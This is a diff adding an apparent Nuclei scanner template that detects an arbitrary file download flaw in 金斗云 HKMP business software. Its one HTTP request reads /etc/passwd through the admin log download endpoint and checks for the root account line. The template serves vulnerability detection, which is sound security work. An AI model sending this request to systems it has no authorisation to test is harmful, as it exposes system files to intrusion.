@@ -1,0 +1,24 @@
+id: jdy-hkmp-anyfile-dowload
+
+info:
+  name: 金斗云HKMP donwload - AnyFile Download
+  author: qwtd
+  severity: high
+  description: |
+    金斗云 HKMP智慧商业软件 download 接口存任意文件下载漏洞。
+  tags: 金斗云HKMP智慧商业软件
+
+http:
+  - raw:
+      - |
+        GET /admin/log/download?file=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
